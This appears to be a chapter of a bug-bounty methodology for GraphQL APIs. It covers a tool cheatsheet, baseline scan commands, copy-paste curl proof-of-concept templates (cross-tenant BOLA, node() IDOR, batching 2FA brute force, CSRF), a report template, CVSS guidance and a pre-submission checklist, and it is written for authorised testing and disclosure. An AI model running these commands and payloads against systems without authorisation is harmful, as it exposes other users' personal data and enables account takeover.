# 08 — Tooling, PoC & Report (Phases 6–7)

---

## 8.1 Tool cheatsheet

| Tool | Use | Command |
|------|-----|---------|
| **graphw00f** | Engine fingerprint + endpoint discovery | `graphw00f.py -d -f -t https://$T/graphql` |
| **InQL** (Burp + CLI) | Introspect, generate all queries/mutations as templates, send to Repeater | `inql -t https://$T/graphql -o out/` — best Burp companion |
| **graphql-cop** | Fast audit: introspection, batching, alias overload, field dup, CSRF, debug | `graphql-cop -t https://$T/graphql -o json` |
| **batchql** | Batching/alias brute-force + DoS checks | `python3 batchql.py -e https://$T/graphql` |
| **clairvoyance / clairvoyanceng** | Recover schema when introspection is OFF (field suggestions) | `clairvoyance -o schema.json -w wordlist.txt https://$T/graphql` |
| **gqlspection / GraphQuail** | Parse introspection, generate queries, Burp ext | GUI/Burp |
| **graphql-path-enum** | Find every path to a sensitive type (authz gaps) | `graphql-path-enum -i schema.json -t User` |
| **nuclei** | Detection + known misconfig templates | `nuclei -t http/misconfiguration/graphql/ -u https://$T/graphql` |
| **sqlmap** | Injection on a captured GraphQL POST | `sqlmap -r req.txt -p '<arg>'` (mark inside JSON body) |
| **Burp: JS Miner / Param Miner / InQL** | Passive JS + operation mining while you browse (JS gate) | Burp extensions |
| **crackql** | GraphQL-aware brute forcer (aliases) | `crackql -t https://$T/graphql -q query.graphql -i wordlist` |

Also: `graphqlmap` (interactive, injection + dumping), `AutoGraphQL`, `graphql-armor` docs (to know
what a *defended* server looks like — helps you recognize which control is missing).

## 8.2 Baseline sweep (run these first on any endpoint)
```bash
graphw00f.py -d -f -t https://$T/graphql          # what engine + is it there
graphql-cop -t https://$T/graphql -o json         # quick misconfig sweep
inql -t https://$T/graphql -o inql_out            # schema + generated operations
clairvoyance -o schema.json -w wordlist.txt https://$T/graphql   # if introspection is off
```
Then hunt by hand — tools find the surface; **you** find the authz bug.

---

## 8.3 PoC templates (60-second, copy-paste — triager-runnable)

**Introspection / schema:**
```bash
curl -s https://$T/graphql -H 'Content-Type: application/json' \
  --data '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types | length'
```

**BOLA (cross-tenant read) — the money PoC:**
```bash
# Tenant B's token requesting Tenant A's object. Show A's data comes back.
curl -s https://$T/graphql \
  -H 'Authorization: Bearer <TENANT_B_TOKEN>' -H 'Content-Type: application/json' \
  --data '{"query":"query{order(id:\"<TENANT_A_ORDER_ID>\"){id total customerEmail}}"}'
# Expected (bug): returns Tenant A's order. Include a count to prove scale:
#   {"query":"{orders{totalCount}}"}
```

**node() global-ID IDOR:**
```bash
GID=$(echo -n 'User:2' | base64)   # VXNlcjoy
curl -s https://$T/graphql -H 'Authorization: Bearer <LOW_PRIV>' -H 'Content-Type: application/json' \
  --data "{\"query\":\"{node(id:\\\"$GID\\\"){... on User{id email phoneNumber}}}\"}"
```

**Batching/alias brute force (2FA bypass):** see `payloads/batching-bruteforce.json`; fire once, grep
the response for `"success":true`.

**CSRF (form content-type):** ship the HTML `<form enctype="text/plain">` from `07`, host it, load as
the victim, show the mutation executed.

## 8.4 Report skeleton (impact-first — operator standard, no "could potentially")

```
Title: [Cross-tenant BOLA] Any authenticated user reads arbitrary orders via GraphQL node(id:)

Summary:
The GraphQL `node(id:)` resolver at POST /graphql returns objects by global ID without verifying
the requesting user owns the object. An authenticated user of Tenant B can read Tenant A's orders
(customer email, address, total) by base64-encoding another tenant's global ID.

Steps to reproduce (curl included, runs in 60s):
1. Log in as attacker (Tenant B), capture Bearer token.
2. Encode a victim object ID: echo -n 'Order:1055' | base64  → T3JkZXI6MTA1NQ==
3. POST the node() query below with the attacker token.
4. Observe Tenant A's order data returned.
[curl block]

Impact:
Any authenticated user reads every other tenant's order PII (name, email, shipping address, order
total). Enumerable — {orders{totalCount}} shows N total objects reachable. Mass-PII disclosure +
cross-tenant isolation break. [one redacted sample record + the count — NOT a full dump]

CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium) — adjust: if PII is highly sensitive or
scope-changed (cross-tenant), argue C:H and S:C → up to High. Score honestly to the actual data class.

Remediation:
Enforce object-level authorization in the node() resolver (and every typed resolver) — verify the
authenticated principal is authorized for the resolved object's tenant before returning it.
```

Hand the writeup to **report-writing** / **report-writer** for platform-specific formatting; validate
with **triage-validation** / **validator** before submitting.

## 8.5 CVSS quick guidance for common GraphQL findings (score honestly)

| Finding | Typical vector | Typical band |
|---------|----------------|--------------|
| Cross-tenant PII read (BOLA) | `AV:N/AC:L/PR:L/UI:N/S:C/C:H` | High (P2), P1 if mass/sensitive |
| BFLA self-privesc / impersonation → ATO | `PR:L/…/C:H/I:H` | Critical (P1) |
| 2FA/login brute force via batching → ATO | `PR:N/…/C:H/I:H` | Critical (P1) |
| SSRF → cloud metadata creds | `PR:L/…/C:H` + chain | Critical (P1) |
| SQLi via argument | `…/C:H/I:H` | High/Critical |
| CSRF changing email → ATO | `UI:R/…/I:H` | High (P2) |
| Mass assignment privesc | `PR:L/…/I:H` | High |
| Introspection enabled (alone) | info | Low / Informational |
| Verbose errors (no secret) | info | Low / Informational |
| DoS (no takedown proof) | `A:L` | Low (P3), respect program rules |

## 8.6 Final gate before you submit (operator 7-Question spirit)
1. Can an attacker do this **right now** against a real user who took no unusual action? If no → kill.
2. Is there **real harm** (money/PII/ATO/RCE)? If it's just introspection/verbose-errors → downgrade.
3. Did you **prove it live**, cross-tenant, with a curl a triager runs in 60s? If not → not yet.
4. Is severity **honest**? Don't inflate a P4 to P1.
5. Did you stay within the **50-record cap** and program rules (no DoS where forbidden)?

If all pass → submit. If not → keep it in the notes, move on.
